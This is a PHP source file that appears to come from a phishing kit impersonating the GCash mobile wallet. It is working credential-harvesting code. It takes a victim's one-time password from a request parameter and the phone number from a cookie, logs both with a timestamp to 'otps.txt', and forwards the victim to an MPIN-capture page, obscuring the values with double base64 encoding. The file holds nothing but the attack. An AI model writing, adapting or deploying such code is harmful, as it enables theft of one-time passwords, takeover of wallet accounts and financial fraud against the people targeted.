<?php
include('system.php');
$today = date("H:i:s");
function file_prepend ($string, $filename) {
	
	$fileContent = file_get_contents ($filename);
	
	file_put_contents ($filename, $string . "\n" . $fileContent);
}
$num = $_COOKIE["gcash_number"];
if (isset($_GET['mpin'])) {

    $otp = base64_decode(base64_decode($_GET['mpin']));
    $replyMsg = "[ <font color='orange'>$ip</font> ] $today | <font color='red'> OTP</font> : <font color='yellow'>$otp - $num</font><br>";
    file_prepend($replyMsg, 'otps.txt');
    $encodenumotp = base64_encode(base64_encode($otp));
    $gcash_number = base64_encode(base64_encode($_COOKIE["gcash_number"]));
    header("Location:mpin.php?mpinclid=$encodenumotp&mobnumid=$gcash_number");


} else{


}


?>